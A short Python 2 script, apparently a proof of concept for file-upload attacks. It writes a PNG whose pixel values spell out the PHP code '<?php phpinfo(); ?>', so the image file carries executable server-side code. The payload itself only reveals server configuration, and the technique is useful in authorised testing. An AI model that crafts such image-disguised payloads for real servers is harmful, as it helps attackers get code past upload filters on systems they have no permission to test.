import png

if __name__ == '__main__':
    f = open('ramp.png', 'wb')      # binary mode is important
    s = '<?php phpinfo(); ?>'
    a = []
    h = []
    for l in s:
        a.append(int(ord(l)))
        h.append(hex(ord(l)))
    print h
    w = png.Writer(len(a), 1, greyscale=True)

    w.write(f, [a])
    f.close()


